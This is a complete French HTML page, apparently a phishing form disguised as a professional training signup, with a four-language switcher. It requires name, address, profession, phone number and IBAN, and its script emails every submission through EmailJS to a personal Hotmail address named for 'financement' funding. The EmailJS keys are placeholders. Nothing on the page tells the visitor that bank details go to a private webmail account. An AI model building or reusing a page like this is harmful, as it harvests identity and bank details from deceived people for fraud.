<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Formation Professionnelle</title>
    <style>
        :root {
            --primary-color: #3498db;
            --secondary-color: #2980b9;
            --background-color: #f9f9f9;
            --text-color: #333;
            --border-color: #ddd;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        h1 {
            color: var(--primary-color);
            margin-bottom: 10px;
        }
        
        .language-selector {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 20px;
        }
        
        .language-selector select {
            padding: 8px;
            border-radius: 5px;
            border: 1px solid var(--border-color);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border-color);
            border-radius: 5px;
            font-size: 16px;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 5px rgba(52, 152, 219, 0.5);
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            transition: background-color 0.3s;
        }
        
        button:hover {
            background-color: var(--secondary-color);
        }
        
        .required {
            color: red;
        }
        
        .success-message {
            display: none;
            background-color: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            text-align: center;
        }
        
        footer {
            text-align: center;
            margin-top: 30px;
            color: #777;
            font-size: 14px;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }
            
            input, select, button {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1 id="title">Formulaire de Formation</h1>
            <p id="subtitle">Veuillez remplir toutes les informations requises</p>
        </header>
        
        <div class="language-selector">
            <select id="language">
                <option value="fr">Français</option>
                <option value="en">English</option>
                <option value="es">Español</option>
                <option value="de">Deutsch</option>
            </select>
        </div>
        
        <form id="training-form">
            <div class="form-group">
                <label for="lastname" id="lastname-label">Nom de famille <span class="required">*</span></label>
                <input type="text" id="lastname" name="lastname" required>
            </div>
            
            <div class="form-group">
                <label for="firstname" id="firstname-label">Prénom <span class="required">*</span></label>
                <input type="text" id="firstname" name="firstname" required>
            </div>
            
            <div class="form-group">
                <label for="country" id="country-label">Pays <span class="required">*</span></label>
                <input type="text" id="country" name="country" required>
            </div>
            
            <div class="form-group">
                <label for="city" id="city-label">Ville <span class="required">*</span></label>
                <input type="text" id="city" name="city" required>
            </div>
            
            <div class="form-group">
                <label for="postalcode" id="postalcode-label">Code postal <span class="required">*</span></label>
                <input type="text" id="postalcode" name="postalcode" required>
            </div>
            
            <div class="form-group">
                <label for="profession" id="profession-label">Profession <span class="required">*</span></label>
                <input type="text" id="profession" name="profession" required>
            </div>
            
            <div class="form-group">
                <label for="phone" id="phone-label">Numéro de téléphone <span class="required">*</span></label>
                <input type="tel" id="phone" name="phone" required>
            </div>
            
            <div class="form-group">
                <label for="iban" id="iban-label">IBAN : numéro de compte <span class="required">*</span></label>
                <input type="text" id="iban" name="iban" required>
            </div>
            
            <button type="submit" id="submit-button">Soumettre le formulaire</button>
        </form>
        
        <div class="success-message" id="success-message">
            Votre formulaire a été soumis avec succès!
        </div>
        
        <footer>
            <p>&copy; 2023 Formation Professionnelle. Tous droits réservés.</p>
        </footer>
    </div>

    <script>
        // Textes multilingues
        const translations = {
            fr: {
                title: "Formulaire de Formation",
                subtitle: "Veuillez remplir toutes les informations requises",
                lastname: "Nom de famille",
                firstname: "Prénom",
                country: "Pays",
                city: "Ville",
                postalcode: "Code postal",
                profession: "Profession",
                phone: "Numéro de téléphone",
                iban: "IBAN : numéro de compte",
                submit: "Soumettre le formulaire",
                success: "Votre formulaire a été soumis avec succès!",
                required: "*"
            },
            en: {
                title: "Training Form",
                subtitle: "Please fill in all required information",
                lastname: "Last Name",
                firstname: "First Name",
                country: "Country",
                city: "City",
                postalcode: "Postal Code",
                profession: "Profession",
                phone: "Phone Number",
                iban: "IBAN: Account Number",
                submit: "Submit Form",
                success: "Your form has been submitted successfully!",
                required: "*"
            },
            es: {
                title: "Formulario de Formación",
                subtitle: "Por favor complete toda la información requerida",
                lastname: "Apellido",
                firstname: "Nombre",
                country: "País",
                city: "Ciudad",
                postalcode: "Código Postal",
                profession: "Profesión",
                phone: "Número de Teléfono",
                iban: "IBAN: Número de Cuenta",
                submit: "Enviar Formulario",
                success: "¡Su formulario ha sido enviado con éxito!",
                required: "*"
            },
            de: {
                title: "Schulungsformular",
                subtitle: "Bitte füllen Sie alle erforderlichen Informationen aus",
                lastname: "Nachname",
                firstname: "Vorname",
                country: "Land",
                city: "Stadt",
                postalcode: "Postleitzahl",
                profession: "Beruf",
                phone: "Telefonnummer",
                iban: "IBAN: Kontonummer",
                submit: "Formular einreichen",
                success: "Ihr Formular wurde erfolgreich übermittelt!",
                required: "*"
            }
        };

        // Changer la langue
        document.getElementById('language').addEventListener('change', function() {
            const lang = this.value;
            updateLanguage(lang);
        });

        function updateLanguage(lang) {
            document.getElementById('title').textContent = translations[lang].title;
            document.getElementById('subtitle').textContent = translations[lang].subtitle;
            document.getElementById('lastname-label').innerHTML = translations[lang].lastname + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('firstname-label').innerHTML = translations[lang].firstname + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('country-label').innerHTML = translations[lang].country + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('city-label').innerHTML = translations[lang].city + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('postalcode-label').innerHTML = translations[lang].postalcode + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('profession-label').innerHTML = translations[lang].profession + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('phone-label').innerHTML = translations[lang].phone + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('iban-label').innerHTML = translations[lang].iban + ' <span class="required">' + translations[lang].required + '</span>';
            document.getElementById('submit-button').textContent = translations[lang].submit;
            document.getElementById('success-message').textContent = translations[lang].success;
        }

        // Gérer la soumission du formulaire
        document.getElementById('training-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Récupérer les données du formulaire
            const formData = {
                lastname: document.getElementById('lastname').value,
                firstname: document.getElementById('firstname').value,
                country: document.getElementById('country').value,
                city: document.getElementById('city').value,
                postalcode: document.getElementById('postalcode').value,
                profession: document.getElementById('profession').value,
                phone: document.getElementById('phone').value,
                iban: document.getElementById('iban').value,
                language: document.getElementById('language').value
            };
            
            // Envoyer les données par email (utilisation d'EmailJS)
            emailjs.send("service_your_service_id", "template_your_template_id", {
                to_email: "finacement199@hotmail.com",
                from_name: formData.firstname + " " + formData.lastname,
                message: `
                    Nouveau formulaire de formation soumis:
                    
                    Nom: ${formData.lastname}
                    Prénom: ${formData.firstname}
                    Pays: ${formData.country}
                    Ville: ${formData.city}
                    Code postal: ${formData.postalcode}
                    Profession: ${formData.profession}
                    Téléphone: ${formData.phone}
                    IBAN: ${formData.iban}
                    Langue: ${formData.language}
                `
            })
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                document.getElementById('success-message').style.display = 'block';
                document.getElementById('training-form').reset();
                
                // Masquer le message de succès après 5 secondes
                setTimeout(function() {
                    document.getElementById('success-message').style.display = 'none';
                }, 5000);
            }, function(error) {
                console.log('FAILED...', error);
                alert("Une erreur s'est produite lors de l'envoi du formulaire. Veuillez réessayer.");
            });
        });

        // Initialiser la langue au chargement
        document.addEventListener('DOMContentLoaded', function() {
            // Définir la langue par défaut
            updateLanguage('fr');
            
            // Initialiser EmailJS avec votre Public Key
            emailjs.init("your_public_key_here");
        });
    </script>
    
    <!-- EmailJS SDK -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
</body>
</html>
